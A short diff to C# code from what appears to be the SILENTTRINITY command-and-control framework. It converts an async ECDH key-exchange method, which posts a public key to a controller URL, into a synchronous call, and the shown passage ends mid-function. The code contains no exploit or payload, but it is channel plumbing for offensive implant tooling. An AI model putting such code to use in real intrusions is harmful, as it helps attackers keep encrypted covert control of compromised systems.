@@ -1,7 +1,6 @@
 ﻿using System;
 using System.Security.Cryptography;
 using System.Text;
-using System.Threading.Tasks;
 using System.Linq;
 using System.IO;
 using System.Collections.Generic;
@@ -11,14 +10,14 @@ namespace SILENTTRINITY.Utilities
     public static class Crypto
     {
         // TODO: Migrate to self implemented Diffie-Hellman Key Exchange
-        async public static Task<byte[]> KeyExchangeAsync(Uri url)
+        public static byte[] KeyExchange(Uri url)
         {
-            byte[] key = default(byte[]);
+            byte[] key = default;
 
             using (ECDiffieHellmanCng AsymAlgo = new ECDiffieHellmanCng())
             {
                 var publicKey = AsymAlgo.PublicKey.ToXmlString();
-                byte[] response = await Http.PostAsync(url, Encoding.UTF8.GetBytes(publicKey));
+                byte[] response = Http.Post(url, Encoding.UTF8.GetBytes(publicKey));
 
                 ECDiffieHellmanCngPublicKey peerPublicKey = 
                     ECDiffieHellmanCngPublicKey.FromXmlString(Encoding.UTF8.GetString(response));
